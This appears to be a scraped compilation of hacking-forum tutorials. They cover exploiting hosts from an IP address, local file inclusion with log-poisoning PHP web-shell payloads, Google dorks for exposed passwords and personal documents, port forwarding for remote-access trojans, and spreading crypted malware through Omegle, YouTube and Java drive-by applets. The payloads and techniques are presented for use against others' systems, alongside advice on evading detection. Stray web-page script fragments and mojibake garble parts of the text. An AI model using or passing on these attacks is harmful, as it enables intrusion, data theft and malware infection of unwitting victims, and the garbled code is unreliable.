where we can start identifying the programs running on the machine. There are some instances in which companies will try and falsify their headers/banners so hackers are unable to find out what programs are truly installed. Now just copy all the banners from all the open ports *Some Ports May Have No Bannners* and organize them in the little record we have of the target. Now we have all the open ports, and a list of the programs running and their version numbers. This is some of the most sensitive information you can come across in the networking world. Other points of interest may be the DNS server, that contains lots of information and if you are able to manipulate it than you can pretend to hotmail, and steal a bunch of peoples email. Well now back to the task at handu. Apart from actual company secrets and secret configurations of the network hardware, you got some good juicy info.  http://www.securityfocus.com  is a very good resource for looking up software vulnerabilities. If you cant find any vulnerabilities there, search on google. There are many, many, many other sites that post vulnerabilities that their groups find and their affiliates.  At SecurityFocus you can search through vendor and whatnot to try and find your peice of software, or you can use the search box. When i searched SecurityFocus i found a paper on how Sendmail 8.12.8 had a buffer overflow. There was proof of concept code where they wrote the shellcode and everything, so if you ran the code with the right syntax, a command prompt would just spawn. You should notice a (#) on the line where your code is being typed. That pound symbol means that the command prompt window thats currently open was opened as root. The highest privilage on a UNIX/Linux Box. You have just successfully hacked a box. Now that you have a command shell in front of you, you can start doing whatever you want, delete everything if you want to be a fucking jerk, however I dont recommend that. Maybe leave a text file saying how you did it and that they should patch their system.....whoever they are. And many times the best thing you can do is just lay in the shadows, dont let anyone know what you did. More often than not this is the path you are going to want to take to avoid unwanted visits by the authorities.  There are many types of exploits out there, some are Denial of Service exploits, where you shut down a box, or render an application/process unusable. Called denial of service simply because you are denying a service on someones box to everyone trying to access it. Buffer Overflow exploits are involved when a variable inside some code doesnt have any input validation. Each letter you enter in for the string variable will be 1 byte long. Now where the variables are located at when they are in use by a program is called the buffer. Now what do you think overflowing the buffer means. We overflow the buffer so we can get to a totally different memory address. Then people write whats called shellcode in hex. This shellcode is what returns that command prompt when you run the exploit. That wasnt the best description of a buffer overflow, however all you need to remember is that garbage data fills up the data registers so then the buffer overflows and allows for remote execution of almost every command available. There are many, many other types of attacks that cannot all be described here, like man-in-the-middle attacks where you spoof who you are. Performed correctly, the slave will enter  http://www.bank.com  and his connection will be redirected to your site where you can make a username and password box, make the site look legit. And your poor mark will enter their credentials into your site, when they think its really  http://www.bank.com . You need to have a small script set up so it will automatiically display like an error or something once they try and log in with their credentials. This makes it seem like the site is down and the slave doenst give it a second thought and will simply try again later.  __________________________________________________ _______o_________  So as a summary of how to 0Wn a box when you only have an IP Address  Method Works On BOTH *Nix and Windoze  ****You can do the same with domain names (IE google.com) than what you can with IP Addresses. Run a WHOIS Lookup or something along those lines. Or check up on InterNIC you should be able to resolve the domain name to an IP address.****  - Port Scan The Address And Record Open Ports  - Telnet To Open Ports To Identify Software Running On Ports  3) netcat - Network swiss army knife. Like TELNET only better and with a lot more functionality. Both can be used when you are trying to fingerprint software on open ports  - Record Banners And Take Note Of The Application Running and The Version Number  - Take A Gander Online At SecurityFocus.com or Eeye.com. If you cant find any vulnerabilities then search google.  - Make a copy of some Proof-Of-Concept code for the vulnerability.  *Read the documentation if there is any, for the proof-of-concept code you will be using for your exploit*  - Run The Exploit Against The slave.  - Reap The Cheap-Sh0t Ownage  __________________________________________________ _______________  **This document does not go into covering your tracks. If you dare try any of this stuff on a box you dont have consent to hack on, They will simply look at the logs and see your IP Address and then go straight to your ISP. Once you get more 1337 you get to learn how to get away with the nasty deeds. This is what the majority of kode-kiddies do when they perform attacks. The key is to enumerate all the info you can from the machine, the more info you have on the system the better. User accounts can also be enumerated. Once you have a list of account names, you may then proceed to brute-force or perform a cryptanalysis attack to gain control of the account. Then you must work on privilage escalation.

0	LFI (local File Inclusion) Injection pentesting (Full Tut)	"""   originally Written By : \""Fredrik Nordberg Almroth\"" Local File Inclusion As the title says, this is a \""short\"" and descriptive guide about various methods to exploit using a local file inclusion (LFI). I will cover the following topics: Ã¢â¬Â¢ Poison NULL Bytes Ã¢â¬Â¢ Log Poisoning Ã¢â¬Â¢ /proc/self/ Ã¢â¬Â¢ Alternative Log Poisoning Ã¢â¬Â¢ Malicious image upload Ã¢â¬Â¢ Injection of code by the use of e-mails Ã¢â¬Â¢ Creativity By: Fredrik Nordberg Almroth So the question is. What is a LFI? A LFI is, as the title says, a method for servers/scripts to include local files on run-time, in order to make complex systems of procedure calls. Well most of the time, you find the LFI vulnerabilities in URLs of the web pages. Mainly because developers tend to like the use of GET requests when including pages. Nothing more. Nothing less. So now, lets proceed shall we? How do you find (fingerprint) them? Lets say you find the following URL: Code: [COLOR=#32CD32]http://site.com/this/exploit/do.php? not=exist.php&for=real[/COLOR] Code: [COLOR=#32CD32]Notice, that this URL goes to the do.php which is a sub-domain to site.com. It has several parameters for the internal do.php to parse, the not and the for variable. Lets study them a bit more. The not variable contains the value of \""exist.php\"", and the for variable contains \""real\"". Now it turned pretty obvious, didnt it? The not variable seem to take another PHP file as an argument, most possibly for inclusion! Hurray! Lets try to play around with it! Now what? Lets try to tamper with the URL to see what we can do with it. Lets change the content of the not variable to \""/etc/passwd\"" and see what happens. Of course you can change the /etc/passwd to any other file of your choice, but well just stick with it through out this tutorial. [CODE] http://site.com/this/exploit/do.php? not=/etc/passwd&for=real   Lets check the result! If you get a result looking something like this: Code: root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin news:x:9:13:news:/etc/news: uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin test:x:13:30:test:/var/test:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin Then sir. Youve done it correctly. Youve found a LFI vulnerability! The /etc/passwd file is world-readable on *NIX systems. That means, you can, by a 99% chance, read it. Unless someone have changed permissions or changed the open_basedir configuration. But more of that some other time! Now lets try another scenario. Say the programmer of the website coded like this:   Code: <?php Ã¢â¬Åinclude/Ã¢â¬Â.include($_GET[for].Ã¢â¬Å.phpÃ¢â¬Â); ?>   How would we do then? We cant read /etc/passwd because the script appends .php to the end of the file. What to do, what to do... Gladly for you, theres another trick here. Poison NULL Byte. The NULL byte, is a special byte used everywhere in the background of your computer (or your targets). Its the binary representation of: 00000000. Yes. 8 zeros in binary, or the hexadecimal representation of 0x00. Right... One of the usages of this special byte is to terminate strings. If youve been programming for a while, you must know what a string is. An amount of text! Okay, it sounds complex now. But this method is really really simple. To bypass the .php concatenation, we simply append after our filename. Code: http://site.com/this/exploit/do.php?for=/etc/passwd   And hopefully, your result is once again: root:x:0:0:root:/root:/bin/bash (Ã¢â¬Â¦) Awesome, we can now read any file on the server (with the privileges the account on the server weve now obtained)! Now you might ask, how can we execute code through this? The answer is... Log poisoning: Say were exploiting a plain normal Apache server. By default, it create two log files called access_log and error_log on the server. If we tamper those logs we can successfully upload our own PHP code on the server, which might give you remote command execution if you wish, the choice is yours. The question is, where are those logs stored? Gladly for you, ive compiled a small list. Here you go:[/COLOR] Code: [COLOR=#32CD32]/etc/httpd/logs/access.log /etc/httpd/logs/access_log /etc/httpd/logs/error.log /etc/httpd/logs/error_log /opt/lampp/logs/access_log /opt/lampp/logs/error_log /usr/local/apache/log /usr/local/apache/logs /usr/local/apache/logs/access.log /usr/local/apache/logs/access_log /usr/local/apache/logs/error.log /usr/local/apache/logs/error_log /usr/local/etc/httpd/logs/access_log /usr/local/etc/httpd/logs/error_log /usr/local/www/logs/thttpd_log /var/apache/logs/access_log /var/apache/logs/error_log /var/log/apache/access.log /var/log/apache/error.log /var/log/apache-ssl/access.log /var/log/apache-ssl/error.log /var/log/httpd/access_log /var/log/httpd/error_log /var/log/httpsd/ssl.access_log /var/log/httpsd/ssl_log /var/log/thttpd_log /var/www/log/access_log /var/www/log/error_log /var/www/logs/access.log /var/www/logs/access_log /var/www/logs/error.log /var/www/logs/error_log C:\\apache\\logs\\access.log C:\\apache\\logs\\error.log C:\\Program Files\\Apache Group\\Apache\\logs\\access.log C:\\Program Files\\Apache Group\\Apache\\logs\\error.log C:\\program files\\wamp\\apache2\\logs C:\\wamp\\apache2\\logs C:\\wamp\\logs C:\\xampp\\apache\\logs\\access.log C:\\xampp\\apache\\logs\\error.log[/COLOR] Now, theres two good methods for proceeding, depending of which log you choose. The best one (in my opinion) is by accessing the error_log. This method is a little outside the box. Say you find an LFI on this server, by simple going to this URL, PHP code will be saved in the error_log:   Code: http://site.com/<?PHP+$s=$_GET;@chdir($s[x]); [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ ($s[y])?>   Now try to reach it by going here:   Code: http://site.com/this/exploit/do.php?for=/var/log/apache/logs/error_log&x=/&y=uname   If your result says something like Linux then your code execution was successful. Yeah yeah, you get the point. It gets stored in the error_log because the    Code: <?PHP $s=$_GET;@chdir($s[x]); [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ ($s[y])?>   file do not exist. Method #2; accessing the access_log. Its a little bit more complicated, the best way to do this is to put PHP code in your user-agent. Theres a great plug-in for Firefox called \""User Agent Switcher\"" to do this on the fly. Other than that, its the same thing. Go to:   Code: http://site.com/   Or any other file accessible on the server, with your user-agent spoofed to your PHP snippet. Then go to the access_log in order to execute the code; eg:   Code: http://site.com/this/exploit/do.php?for=/var/log/apache/logs/access_log&x=/&y=<<command goes here>>   Yeah sure, youre so cool, you can execute your own code! Now,lets be hardcore. /proc/self: The Linux kernel is fascinating. Im not sure if youve heard of this, but the /proc/self is a symbolic link (symlink) going to the instance of the target HTTP server. There is several things you can do by using this link, one is to do the access_log-method, by simply spoofing your user-agent to PHP code, then try to include the /proc/self/environ. Everyone knows that these days. Thats not fun. However your code will be executed! Lets move on to more... Uncommon methods. You can obtain the HTTP configuration file by simply trying to include /proc/self/cmdline, because most of the time the config file is set by a command-line argument, a simple, but a cool \""feature\"", nothing malicious here, thats just the way it works. What you choose to do with the config file is up to you. The log-file location(s) tend to be in there... You got the grip now, Ill just keep writing. There is yet another way to resolve the log-files by using this link, by simply going to the file description of the log file (the running stream). Handy? Ã¢â¬Â¢ Yes No need for you to run a dictionary-attack in order to resolve the different log-files or to include the /proc/self/cmdline. Now, how do we access those file descriptions? Well sir, the /proc/self tend to have a folder (?) called fd. You guessed it right. fd do stand for file description. The content within fd is numeric IDs going to different open files. So the easiest way for us to find is, is to simply iterate our way through.   Code: http://site.com/this/exploit/do.php?for=/proc/self/fd/0 http://site.com/this/exploit/do.php? for=/proc/self/fd/1 http://site.com/this/exploit/do.php? for=/proc/self/fd/2 Ã¢â¬Â¦ http://site.com/this/exploit/do.ph p ? for=/proc/self/fd/N Sooner or later, youll find one of the log-files. By doing that you just go with the access_log or the error_log method(s). Now seriously. Have you ever had any success with the ordinary \""Log Poisoning\"" methods? I mean, in like 95% of the cases your requests gets URI encoded, and by that ruining your code. So here comes an alternative method: Alternative Log Poisoning: Apache got the tendency to log the Authorized user if any is specified. The Authorization header is a part of the HTTP protocol, Ive bet youve seen it. It creates a prompt asking for a username and password as htaccess do when you try to reach a protected folder. Internet Explorer makes a prompt looking like this: Yeah, well. The username and password gets sent base64 encoded with : as a separator. And as you might have figured out, the base64 wont get URIencoded! So by providing this header in your HTTP request: Authorization: Basic PD9QSFAgJHM9JF9HRVQ7QGNoZGlyKCRzWyd4J10pO2VjaG9Ac3lzdGVtKCRzWyd5J1 0pPz46 The code will stay untouched, and simply unpacked by Apache straight to the logs. The base64 is the small PHP payload Ive used earlier, just with a : in the end to follow the HTTP RFCs. Now when were on to it, exploiting using different methods and stuff. Why not exploit LFI with a JPG? Malicious image upload: Yes, you heard me. You can use a picture in order to execute code by the use of a LFI vulnerability. However you need special software to do this for you. The attack consists in changing the EXIF data of the image of your choose. Say youre exploiting a community, which allows image uploads, for lets say, your avatar. By tampering with the EXIF data and by finding a LFI you can take full control! Cool huh? The EXIF data tend to hold what camera model, year, place, location, etc... When the image was taken, but, as proven before, its rather easy to tamper with. Injection of code by the use of e-mails: Say your target server got port 109 or 110 open (POP2 or POP3) for handling of e-mails. You could send an e-mail to the HTTP server-user on target box. Like: \"" [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ \"" And then try to include the /var/spool/mail/apache if this exists. Its possible to execute through this as well. However its not very common to find this specific exploit. Of course, the mail you send will contain the PHP code for you to execute. There is literary hundreds of ways to perform this attack depending on the mail-server running back-end. Qmail, for example, stores the incoming mails in /var/log/maillog by default, but as been said before, this is thinking outside the box. Creativity: Why stop here? Im sure the Linux kernel, IRIX, AIM, Windows, SunOS, BSD and other OSes provides yet more interesting exploit scenarios. Do they have SSH open? If so, try to inject PHP code as the SSH username and go grab the SSH log. Will it work? Maybe? Can the embedding of malicious content like the JPG EXIF field be done withing a MP3 file? Try it yourself. Be creative.     """
0	♛♛ Super Easy Port forwarding. ★UPnP	""" When i first started using RATs i had no idea how to portforward. It seemed completely alien to me. The HF community sent me in the direction of Darkcomet as it had the great advantage of built in UPnP... Universal Plug and Play (Forwards your port automatically if your Router supports it) the worry of having to manually change my routers settings was now gone! for a while anyway... The time eventually came for me to upgrade to paid software for more features and a more stable server. I Still had no idea how to portforward so i searched online for a program that replaced Darkcomets great port forwarding tool. Heres the program i found and still use to this day  \""UPnP Port Forward Utility - ver 1.00\"" Why? Because it works perfectly, takes about 15 seconds to forward a new port, and i currently have no need to use anything else. The Main screen above shows all of your open ports and the program behind it. After clicking \""add new entry\"" you will be prompted to enter these details.

0	Increasing Torrent Performance for Maximum Speed [TuT]	""" Torrents and the BitTorrentfile distribution system has become extremely popular these days and has become one of the most popular mediums for downloading files off the Internet. If you do not already know, a torrent file is a type of computer file that contains metadata about files and folders which is shared and distributed in a large network of computers known as trackers. You can refer to this link for more information about torrents. There are various torrent clients used to download files from this network and the most popular ones are: Some users while downloading files using torrent clients experience slow downloads which can often be caused by incorrect configuration settings of the router or a firewall on the system. So by tinkering with the configuration settings for a bit, you can easily increase your torrent download speed and enjoy a fast download. Below IÃ¢â¬â¢ll be showing you couple of methods and tips you can use to increase torrent performance on your PC. Throughout this guide, weÃ¢â¬â¢ll be using uTorrent to test and configure so it is advised you use uTorrent too.[/b] Configuring uTorrent for Maximum Speed and Efficiency First we will be changing some inbuilt settings of uTorrent to increase the performance. For that, first we need to know our connection upload speed. A simple way to do that is by visiting a website called SpeedTest. The website lets you easily calculate your connection quality, the upload and download speed. Now youÃ¢â¬â¢ll see something like in the picture above. YouÃ¢â¬â¢ll need to click the BEGIN TEST to start measuring your network speed. Make sure you pause all your ongoing downloads or other pages that uses your bandwidth before you click BEGIN TEST. This is important to get the right speed of your Internet. Once youÃ¢â¬â¢re done, youÃ¢â¬â¢ll see something like in this picture above. Your download speed and upload speed depends entirely on your connection so it might vary a lot. But what you need is the Upload Speed which is 0.38 Mbps in the above case. We will need this value later on. So either note this value down or just remember it. Now we can move onto the next step which is calculating the values for configuring uTorrent. So once youÃ¢â¬â¢ve got your upload speed, we need to go to another website to get the correct values for the configuration settings in uTorrent. The website weÃ¢â¬â¢ll use is Azureus Upload Settings Calculator. Click  http://www.infinite-source.de/az/az-calc.html  to visit the website. Now you will see something like this:[/b][/color] Now I believe youÃ¢â¬â¢ve seen two boxes at the top where you can enter your upload speed, either in kilobit/second or kilobyte/second. Now you know your speed was displayed in Megabits/second so we need to convert it to kilobits/second. To do that, simply multiply your upload speed with 1024. So in my case it would be 0.38*1024=380 kilobits/second. Alternately, you can use a website like  ConvertUnits  to convert Mbps to Kbps.[/b][/color] Now what you need to do is enter this value, in to the respective field in our Azureus webpage and get the results. So as soon as you fill this upload speed in the website, the remaining columns will be auto-filled with values, values that youÃ¢â¬â¢ve to enter in uTorrent to optimize it. So here is how itÃ¢â¬â¢ll look like once youÃ¢â¬â¢ve entered the value into the box. Please know that the values you get on entering your upload speed will be different from mine and you have to use the values which YOU get to proceed to the further steps. So these are the values we will be using to optimize uTorrent. So make sure you do not close this page since we require these values for the upcoming steps. Once youÃ¢â¬â¢ve got the values, we are proceeding to the next step which is assigning the optimized values to the uTorrent configuration settings. For that, first open up uTorrent. Once youÃ¢â¬â¢ve done that, Click  Options > Preferences . Once the preferences window has opened, we need to fill up the values. For that click the Bandwidth[/color] tab on the left pane and fill the values into the respective columns like this: Now head to the Queuing Tab from the Left Pane and fill up the rest of the values like this: Yeah! YouÃ¢â¬â¢re all done. Now youÃ¢â¬â¢ve actually optimized your uTorrent configuration settings to suit your internet connection and your PC. Unlike other tutorials which promise you 100% speed increase, this is an actual working method which you can try and use on your PC. Now weÃ¢â¬â¢ve successfully covered the first part of this tutorial. In the next part, weÃ¢â¬â¢ll tinker a bit more and utilize something called ports and learn how it can really help to increase your uTorrent speed. Optimizing Ports To Increase Download Speed Once weÃ¢â¬â¢ve configured the upload settings, itÃ¢â¬â¢s time to optimize our ports. If you know nothing about ports, a port is a network resource that your torrent client uses to allow other systems in the network to access your PC. All the ports have unique numbers like 3333 or 4545 which are known as TCP port number. So when other systems try to access your PC, they do it through some random ports. Suppose theyÃ¢â¬â¢re trying to access port number 5435 and if your ports are closed or blocked, they wonÃ¢â¬â¢t be able to access your PC and stops connections to your PC and thereby decrease your download speed. So youÃ¢â¬â¢ll need forwarded ports to have maximum connections to PC in the network and get maximum download speed. So we will be learning how to open ports and enable others to establish a connection to your PC. First what you need to do is disable any firewalls on your PC. If you have a firewall or Antivirus program installed, it will block incoming connections thereby decreasing your download speed. So you need to disable any firewalls or antivirus programs on your PC. Alternatively, you can add an exception for your uTorrent client in the firewall too. This will have the same effect. Now we need to forward a particular port. Now there are no specific instructions on how to forward a port on your PC. It completely depends on what type and brand of router youÃ¢â¬â¢ve got. The settings will completely vary and to overcome this difficulty, we will be using a website named  [url=http://www.portforward.com/]PortForward Once youÃ¢â¬â¢ve entered the website, youÃ¢â¬â¢ll see two boxes where you can choose your router brand and your router model and then the website will give you specific instructions to forward a port for a particular application on your PC. So specify the brand and model and then choose uTorrent from the list of applications to forward. Now youÃ¢â¬â¢ll see specific instructions just for you like this: Now once youÃ¢â¬â¢ve followed all the steps itÃ¢â¬â¢s time to check whether youÃ¢â¬â¢ve successfully forwarded the port. This ensures youÃ¢â¬â¢ve done all the steps right and youÃ¢â¬â¢re ready to use the port. For that we will be visiting the website  http://www.canyouseeme.org/CanYouSeeMe . When youÃ¢â¬â¢re in the website, enter the port which you forwarded and click Check Your Port to know whether youÃ¢â¬â¢ve done it right. If yes, the website will say youÃ¢â¬â¢ve successfully forwarded. Else it will pop up an error in which case youÃ¢â¬â¢ve to repeat the steps and rectify it. ThatÃ¢â¬â¢s it! YouÃ¢â¬â¢ve successfully optimized your uTorrent for maximum download speed. All your downloads will be much faster from now on and youÃ¢â¬â¢ll be having lots of connections from your PC making it even better. If youÃ¢â¬â¢ve followed this guide, I can guarantee youÃ¢â¬â¢ve now got a faster download speed. That sums it up for this tutorial. Thanks for reading.[/b] i am not founder of this detail. i got this detail from another site. Download Code: http://rghost.net/45969070 http://ge.tt/35CTfWg/v/4   """
0	How to use Google for Hacking.	""" 1. Hacking Security Cameras There exists many security cameras used for monitoring places like parking lots, college campus, road traffic etc. which can be hacked using Google so that you can view the images captured by those cameras in real time. All you have to do is use the following search query in Google. Type in Google search box exactly as follows and hit enter inurl:”viewerframe?mode=motion” Click on any of the search results (Top 5 recommended) and you will gain access to the live camera which has full controls. you now have access to the Live cameras which work in real-time. You can also move the cameras in all the four directions, perform actions such as zoom in and zoom out. This camera has really a less refresh rate. But there are other search queries through which you can gain access to other cameras which have faster refresh rates. So to access them just use the following search query. intitle:”Live View / – AXIS” Click on any of the search results to access a different set of live cameras. Thus you have hacked Security Cameras using Google. 2. Hacking Personal and Confidential Documents Using Google it is possible to gain access to an email repository containing CV of hundreds of people which were created when applying for their jobs. The documents containing their Address, Phone, DOB, Education, Work experience etc. can be found just in seconds. intitle:”curriculum vitae” “phone * * *” “address *” “e-mail” You can gain access to a list of .xls (excel documents) which contain contact details including email addresses of large group of people. To do so type the following search query and hit enter. filetype:xls inurl:”email.xls” Also it’s possible to gain access to documents potentially containing information on bank accounts, financial summaries and credit card numbers using the following search query intitle:index.of finances.xls 3. Hacking Google to gain access to Free Stuffs Ever wondered how to hack Google for free music or ebooks. Well here is a way to do that. To download free music just enter the following query on google search box and hit enter. “?intitle:index.of?mp3 eminem“ Now you’ll gain access to the whole index of eminem album where in you can download the songs of your choice. Instead of eminem you can subtitute the name of your favorite album. To search for the ebooks all you have to do is replace “eminem” with your favorite book name. Also replace “mp3″ with “pdf” or “zip” or “rar”. 4. Using Google, and some finely crafted searches we can find a lot of interesting information. For Example we can find: Credit Card Numbers Passwords Software / MP3′s …… (and on and on and on) Presented below is just a sample of interesting searches that we can send to google to obtain info that some people might not want us having.. After you get a taste using some of these, try your own crafted searches to find info that you would be interested in. Try a few of these searches: intitle:”Index of” passwords modified allinurl:authuserfile.txt “access denied for user” “using password” “A syntax error has occurred” filetype:ihtml allinurl: admin mdb “ORA-00921: unexpected end of SQL command” inurl:passlist.txt “Index of /backup” “Chatologica MetaSearch” “stack tracking:” Amex Numbers: 300000000000000..399999999999999 MC Numbers: 5178000000000000..5178999999999999 visa 4356000000000000..4356999999999999 “parent directory ” /appz/ -xxx -html -htm -php -shtml -opendivx -md5 -md5sums “parent directory ” DVDRip -xxx -html -htm -php -shtml -opendivx -md5 -md5sums “parent directory “Xvid -xxx -html -htm -php -shtml -opendivx -md5 -md5sums “parent directory ” Gamez -xxx -html -htm -php -shtml -opendivx -md5 -md5sums “parent directory ” MP3 -xxx -html -htm -php -shtml -opendivx -md5 -md5sums “parent directory ” Name of Singer or album -xxx -html -htm -php -shtml -opendivx -md5 -md5sums Notice that I am only changing the word after the parent directory, change it to what you want and you will get a lot of stuff. METHOD 2 put this string in google search: ?intitle:index.of? mp3 You only need add the name of the song/artist/singer. Example: ?intitle:index.of? mp3 jackson METHOD 3 put this string in google search: inurl:microsoft filetype:iso You can change the string to watever you want, ex. microsoft to adobe, iso to zip etc… “# -FrontPage-” inurl:service.pwd Frontpage passwords.. very nice clean search results listing !! “AutoCreate=TRUE password=”  This searches the password for “Website Access Analyzer”, a Japanese software that creates webstatistics. For those who can read Japanese, check out the author’s site at: coara.or.jp/~passy/ [or.jp] “ http://:@www”  domainname This is a query to get inline passwords from search engines (not just Google), you must type in the query followed with the the domain name without the .com or .net “ http://:@www”  bangbus or “ http://: [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ ”bangbus Another way is by just typing “ http://bob: [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ ” “sets mode: +k” This search reveals channel keys (passwords) on IRC as revealed from IRC chat logs. allinurl: admin mdb Not all of these pages are administrator’s access databases containing usernames, passwords and other sensitive information, but many are! allinurl:authuserfile.txt DCForum’s password file. This file gives a list of (crackable) passwords, usernames and email addresses for DCForum and for DCShop (a shopping cart program(!!!). Some lists are bigger than others, all are fun, and all belong to googledorks. =) intitle:”Index of” config.php This search brings up sites with “config.php” files. To skip the technical discussion, this configuration file contains both a username and a password for an SQL database. Most sites with forums run a PHP message base. This file gives you the keys to that forum, including FULL ADMIN access to the database. eggdrop filetype:user user These are eggdrop config files. Avoiding a full-blown descussion about eggdrops and IRC bots, suffice it to say that this file contains usernames and passwords for IRC users. intitle:index.of.etc This search gets you access to the etc directory, where many many many types of password files can be found. This link is not as reliable, but crawling etc directories can be really fun! filetype:bak inurl:”htaccess|passwd|shadow|htusers” This will search for backup files (*.bak) created by some editors or even by the administrator himself (before activating a new version). Every attacker knows that changing the extenstion of a file on a webserver can have ugly consequences. Let’s pretend you need a serial number for windows xp pro. In the google search bar type in just like this – “Windows XP Professional” 94FBR the key is the 94FBR code.. it was included with many MS Office registration codes so this will help you dramatically reduce the amount of ‘fake’ porn sites that trick you. or if you want to find the serial for winzip 8.1 – “Winzip 8.1″ 94FBR Credits and More Info  http://johnny.ihackstuff.com I have shown you this info to let you know that there is a real risk putting your info online. If you do want to buy stuff online make sure the site you are using is secure normally if a site is secure you will see a pop up saying you are now entering a secure part of the site or a symbal of a padlock at the bottom of your browser or just use pay pal, pay pal is very safe to use. But most of the time just use common sense if a site looks cheap it normally hasn’t got the protection to keep your info safe. I am not saying don’t buy stuff online because that is one of the best thing’s about the internet i am just saying be aware of websites that want your bank details and there is no symbal of a padlock at the bottom of your browser 5.Crash a Computer using Flash and Google. Open up a new flash document. Open up the Actions panel for the stage of the first frame. If it’s in Actionscript 2, write the following: onEnterFrame = function () { getURL(“ http://www.google.com” , “_blank”); } Or if it’s actionscript 3 write the following: function openGoogle(e:Event):void { navigateToURL(“ http://www.google.com” , “_blank”); } stage.addEventListener(Event.ENTER_FRAME, openGoogle); """

0	[Tutorial] How To Spread Your Viruses to everyone successfully	""" In this tutorial I will show you how to spread your trojans/viruses etc. I will show you many methods, and later you choose which one you are going to use. What Is Spreading? Spreading is the way of your trojans/programs/viruses circulates around the Internet. The point of spreading is to put something hard to find, which people like it. Its about what all people want, but dont have it yet. Well the goal of spreading is to get more victims to your RATs/Keyloggers whatever. Getting Started Well, to spread you will need a program to bind your virus with. If you want to get more victims, try to find a small program, advoid large programs. If you dont have any ideas search around the Internet, you will find a lot of fake programs, such as KeyGenerators, Gold Hackers etc. Other way is to make your own programs, its easy all you need is a little programming knowledge or you can find good source around here. Ok, now the main part if you want your spread to be successfully is to make your viruses FUD by AVs. To make your viruses use a binder or crypter. Most of public binders and crypters, are detected even if they are FUD will be detected soon, so the best way is to use a private stub, and it will stay longer FUD. There are many Crypters and Binders you can use, just go the Sellers Section, or search around the Internet! Make sure to test your virus after crypting or binding, because some binders and crypters corrupt the files. Hint for beginners [If you already know this, skip this part]: A Crypter is a programs that makes other programs UD or FUD by encrypting them. A Binder is a program that makes other programs UD or FUD by binding them with another file. UD means undetected, so only a few antivirus programs detect it. FUD means fully undetected, so no antivirus detect it. How and where to spread Well guys, this is the part who all were waiting for. I will show you a few methods how to spread you viruses and trojans. 1. Omegle Omegle is a brand-new service for meeting new friends. When you use Omegle, we pick another user at random and let you have a one-on-one chat with each other. Chats are completely anonymous, although there is nothing to stop you from revealing personal details if you would like. You can use Omegle auto spreader while you sleep or when you are free. You can find Omegle Spreader here:  http://uploading.com...e+Spreader.exe/ 2. YouTube YouTube is a video sharing website on which users can upload and share videos. Make a short video, no longer than 30 seconds or a minute. In the description, make a short tutorial on how to use the program or the keygen you binded your virus with, add the features of the program and put a download link of your virus. Take a picture as proof aswell, that will make people trust your virus more. Make sure you use a good file hosting, because for example rapidshare wont let them download it first time, so people will get bored and wont download. I use mediafire, awesome host and allows you to see the downloads aswell. 3. Java drive by applet Well, this is a nice method of spreading you virus. First of all, for this method you will need a  http://file  ave.com account. Next step is download the Java files. http://www.multiupload.com/SYURWIVJOV  Ok, now login to your FileAve account upload your keylogger/RAT or whatever and copy the direct link for your virus. Then go to the folder with Javas and open \""index2.html\"" right click> Open with.. .> notepad. Now where it says \""http://clerisy.filea...om//blabla.exe\"" replace it with your virus direct link. You should replace your virus TWICE. 